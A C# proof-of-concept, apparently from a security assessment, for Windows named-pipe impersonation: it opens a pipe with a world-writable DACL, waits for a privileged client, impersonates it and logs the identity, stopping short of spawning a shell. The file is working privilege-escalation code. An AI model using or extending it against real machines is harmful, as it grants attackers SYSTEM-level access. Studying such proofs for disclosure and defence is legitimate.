// impersonate.cs — receive a privileged connection on a pipe we own, then act as that client.
//
// This is the PoC for "a SYSTEM component can be made to connect to a pipe I control", and for
// the service-account case where the account already holds SeImpersonatePrivilege.
//
// Build:  csc /nologo /unsafe impersonate.cs
// Run:    impersonate.exe TargetPipe      (then trigger the product feature that connects)
//
// It PROVES the boundary crossing and stops: it writes the impersonated identity to a file.
// It does not spawn a shell.
using System;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Threading;

class Impersonate {
    static void Main(string[] a) {
        string pipe = a.Length > 0 ? a[0] : "TargetPipe";
        Console.WriteLine("[*] listening as: " + WindowsIdentity.GetCurrent().Name);
        Console.WriteLine("[*] whoami /priv -> confirm SeImpersonatePrivilege is present");
        Console.WriteLine("[*] creating \\\\.\\pipe\\" + pipe + " with a permissive DACL");

        var sec = new PipeSecurity();
        sec.AddAccessRule(new PipeAccessRule(
            new SecurityIdentifier(WellKnownSidType.WorldSid, null),
            PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));

        using (var srv = NamedPipeServerStream.Create(
                   pipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte,
                   PipeOptions.None, 4096, 4096, sec)) {
            Console.WriteLine("[*] waiting for a client. Trigger the product feature now.");
            srv.WaitForConnection();
            srv.RunAsClient(() => {
                var id = WindowsIdentity.GetCurrent();
                string line = DateTime.Now + "  impersonating: " + id.Name +
                              "  isSystem=" + id.IsSystem + "  token=" + id.Token;
                Console.WriteLine("[+] " + line);
                File.AppendAllText(@"C:\Users\Public\wh_impersonate_proof.txt", line + Environment.NewLine);
            });
            srv.Disconnect();
        }
        Console.WriteLine("[*] done — proof in C:\\Users\\Public\\wh_impersonate_proof.txt");
    }
}
